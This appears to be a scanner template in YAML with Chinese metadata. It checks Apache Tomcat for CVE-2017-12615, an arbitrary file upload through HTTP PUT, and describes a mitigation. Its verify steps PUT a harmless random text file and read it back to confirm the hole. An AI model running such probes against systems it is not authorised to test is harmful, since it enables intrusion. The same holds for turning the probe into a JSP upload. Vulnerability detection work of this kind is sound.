app: Apache Tomcat
query: app:"Apache Tomcat"
meta:
  name: Tomcat任意写入文件漏洞(CVE-2017-12615)
  level: 5
  tags:
    - file_upload
  description: 2017年9月19日，Apache Tomcat官方确认并修复了两个高危漏洞，漏洞CVE编号：CVE-2017-12615和CVE-2017-12616，其中 远程代码执行漏洞（CVE-2017-12615） 当 Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT 请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求向服务器上传包含任意代码的 JSP 文件。之后，JSP 文件中的代码将能被服务器执行。
  homepage: https://tomcat.apache.org/
  author: 一曲成殇
  references: https://blog.csdn.net/weixin_42181573/article/details/119994927
  solution: |-
    用户可以禁用PUT方法来防护此漏洞，操作方式如下：
    在Tomcat的web.xml 文件中配置org.apache.catalina.servlets.DefaultServlet的初始化参数
    <init-param>
    <param-name>readonly</param-name>
    <param-value>true</param-value>
    </init-param>
  steps:
    variable:
      - r1: randomLowercase(5)
    verify_steps:
      type: and
      verify:
        - request:
            method: PUT
            path: /{{r1}}.txt
            redirect: false
            header: [ ]
            params: '{{r1}}'
          response:
            - name: code
              value: "201"
              type: equals
        - request:
            method: GET
            path: /{{r1}}.txt
            redirect: false
          response:
            - name: code
              value: "200"
              type: equals
            - name: body
              value: '{{r1}}'
              type: equals
  create_at: "2022-04-27 15:19:21"
